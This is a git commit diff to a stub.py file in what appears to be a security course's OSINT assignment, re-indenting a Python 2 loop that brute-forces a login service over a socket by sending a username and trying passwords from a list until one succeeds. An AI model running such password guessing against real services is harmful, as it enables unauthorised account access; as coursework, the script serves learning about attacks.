b9c646a2370928af60515114cc166182e4dbfb9b
Kimchee4Me <esther.m.malone@gmail.com>
2019-02-22 23:16:56 -0500

    Update stub.py

--- assignments/2_OSINT/writeup/stub.py
+++ assignments/2_OSINT/writeup/stub.py
@@ -15,19 +15,21 @@ def brute_force():
     result = "Fail\n"
   
     while result == "Fail\n":
-      print "Failed"
-      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      sock.connect((host,port))
-      result = sock.recv(1024)
+        print "Failed"
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((host,port))
+        result = sock.recv(1024)
     
-      """ send username then the password """
-      sock.send(username + "\n")
-      result = sock.recv(1024)
+        """ send username then the password """
+        sock.send(username + "\n")
+        result = sock.recv(1024)
     
-      sock.send(list_of_passwords[i])
-      result = sock.recv(1024)
-      i += 1
+        sock.send(list_of_passwords[i])
+        result = sock.recv(1024)
+        i += 1
     password = list_of_passwords[i-1]
     print("password found: " + password)
+
+    
 if __name__ == '__main__':
-brute_force()
+    brute_force()
